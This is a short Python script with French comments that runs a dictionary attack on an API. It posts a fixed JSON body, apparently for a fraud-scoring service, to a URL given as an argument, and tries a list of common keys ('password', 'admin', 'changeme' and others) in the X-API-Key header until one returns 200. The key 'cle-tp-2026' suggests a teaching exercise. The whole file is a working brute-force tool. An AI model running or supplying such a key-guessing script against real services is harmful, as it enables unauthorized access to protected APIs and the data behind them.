"""Attaque par dictionnaire : essaie des cles d'API courantes."""
import sys

import requests

URL = sys.argv[1]
CORPS = {"montant": 1800, "anciennete": 30, "freq_24h": 4, "nuit": 1}
DICTIONNAIRE = ["", "test", "1234", "123456", "azerty", "password", "secret",
                "api", "apikey", "cle", "admin", "root", "changeme", "cle-tp-2026"]

for n, cle in enumerate(DICTIONNAIRE, start=1):
    r = requests.post(URL, json=CORPS, headers={"X-API-Key": cle},
                      timeout=5, verify="certs/client.pem")
    print(f"essai {n:2d}  cle={cle!r:14}  -> {r.status_code}")
    if r.status_code == 200:
        print(f"CLE TROUVEE en {n} essais : {cle!r}")
        break
else:
    print(f"echec : aucune des {n} cles n'a fonctionne")
